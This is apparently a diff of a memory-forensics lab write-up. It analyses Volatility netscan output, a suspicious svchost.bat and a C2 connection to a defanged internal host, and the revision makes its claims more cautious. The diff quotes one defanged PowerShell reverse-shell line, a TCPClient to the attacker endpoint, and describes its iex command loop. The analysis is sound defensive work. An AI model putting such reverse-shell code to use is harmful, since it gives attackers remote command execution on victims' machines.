@@ -7,77 +7,73 @@
 
 ## 1. Objective
 
-Identify malicious network connections associated with the compromised host and validate command-and-control (C2) activity.
+Record the network state that netscan reports for the endpoint named in the exercise, and
+the PowerShell code the range-supplied strings output associates with it.
 
-## 2. Known Indicators (Defanged)
+## 2. Endpoint Under Review (Defanged)
 
-| Type | Indicator |
-|------|----------|
-| Remote C2 | 10[.]0[.]128[.]2:4337 |
-| Suspected File | C:\Windows\System32\svchost.bat |
-| Execution Pivot | powershell.exe (PID 5104) |
+| Item | Value | Basis |
+|------|-------|-------|
+| Remote endpoint | 10[.]0[.]128[.]2:4337 | Range-confirmed answer (Q8); present in netscan |
+| Associated file | C:\Windows\System32\svchost.bat | Range-confirmed (Q8) |
 
-## 3. Active Network Connections
+## 3. Connection at Capture
 
-**Command used**:
+Command as recorded (image path normalised to `memory.dmp`):
 
-`python vol.py -f memory.dmp --profile=Win10x64_17763 -g 0xf8034da8a4d8 netscan`
+```
+python vol.py -f memory.dmp --profile=Win10x64_17763 -g 0xf8034da8a4d8 netscan | Select-String -Pattern '10.0.128.2'
+```
 
-**Filtered for C2 IP**:
+Observed result:
 
-`python vol.py -f memory.dmp --profile=Win10x64_17763 netscan | Select-String "10[.]0[.]128[.]2"`
+| Protocol | Local Address | Remote Address | State | Owner PID |
+| :--- | :--- | :--- | :--- | :--- |
+| TCPv4 | 10[.]0[.]128[.]0:63944 | 10[.]0[.]128[.]2:4337 | ESTABLISHED | -1 |
 
-**Result**
-| Local Address | Remote Address | State |
-| :--- | :--- | :--- |
-| 10[.]0[.]128[.]0:63944 | 10[.]0[.]128[.]2:4337 | ESTABLISHED |
+### Observations
 
-## 4. Source Port Identification
-- Local source port: 63944
-- Protocol: TCPv4
-- Connection state: ESTABLISHED
+- The connection was in state `ESTABLISHED` when the image was taken.
+- The owner PID field is `-1`: netscan does not tie this connection to any process.
+- The recorded row carries no creation time.
+- Range-confirmed: the exercise accepted 63944 as the source port of the malicious session.
+- Analyst inference: the ephemeral local port suggests the imaged host was the client side.
 
-**Interpretation**:
+## 4. Code in the Range-Supplied Strings Output
 
-The compromised system initiated an outbound TCP connection from ephemeral port 63944 to the attacker-controlled endpoint.
-
-## 5. C2 Script Behavior
-**Extracted from strings_out.txt**:
+`strings_out.txt` was supplied by the range; its derivation from the image was not
+repeated. Parsed from it (defanged):
 
 `$client = New-Object System.Net.Sockets.TCPClient('10[.]0[.]128[.]2',4337);`
 
-**Defanged**:
+The recorded excerpt continues with a loop that reads from the stream, evaluates received
+data with `iex`, and converts the result with `Out-String`. The notes record no association
+between the excerpt and `svchost.bat`; the exercise makes that association. Whether the
+code executed, and in which process, is not recorded.
 
-`10[.]0[.]128[.]2:4337`
+Analyst inference: the code is a basic reverse-shell pattern.
 
-**Behavioral Analysis**
+## 5. Timing
 
-The script:
-- Creates a TCP client connection
-- Reads incoming commands from remote host
-- Executes commands via iex
-- Sends output back over the same stream
+| Time (UTC) | Observation | Warrant |
+| :--- | :--- | :--- |
+| 2023-02-03 13:25:04 | MFT `$STANDARD_INFORMATION` values, `svchost.bat` | mftparser row, `UTC+0000` |
+| 2023-02-03 13:29:33 | Memory image timestamp; connection `ESTABLISHED` at capture | imageinfo, `UTC+0000` |
 
-This behavior is consistent with a basic reverse-shell implementation.
+The connection's start time is not recorded and is not inferred from the MFT value.
 
-## 6. Timeline Correlation
-| Time (UTC) | Event |
-| :--- | :--- |
-| 13:23:40 | PowerShell process started |
-| 13:25:04 | `svchost.bat` created |
-| ~13:25+ | C2 connection established |
-| 13:29:33 | Memory capture time (Session Active) |
+## 6. MITRE ATT&CK
 
-## 7. MITRE ATT&CK Mapping
-Technique	ID	Evidence
-Application Layer Protocol	T1071	TCP-based C2
-Command and Scripting Interpreter	T1059	PowerShell reverse shell
-Ingress Tool Transfer	T1105	C2 command execution over TCP
+No command-and-control technique is mapped. The recorded code opens a raw TCP socket and
+no application-layer protocol was observed; port 4337 alone does not establish a
+protocol-to-port mismatch; and no file transfer was observed. See the
+[MITRE ATT&CK Mapping](mitre-attack-mapping.md), section "Considered and Not Mapped".
 
-## 8. Network-Level Conclusion
-**C2 Communication**: Confirmed
-**Protocol**: TCP
-**Connection State at Capture**: ESTABLISHED
-**Credential Theft Preceded C2**: Yes
+## 7. Network-Level Conclusion
 
-The compromised host maintained an active outbound command channel to an attacker-controlled endpoint.
+- **Observed:** an ESTABLISHED TCP connection to `10[.]0[.]128[.]2:4337` from local port
+  63944 at capture, with no recorded owner.
+- **Range-confirmed:** the endpoint is the one used by `svchost.bat` and the session is
+  malicious.
+- **Not established:** the process that owned the connection, when it began, and its
+  temporal relation to the LSASS dump invocation.
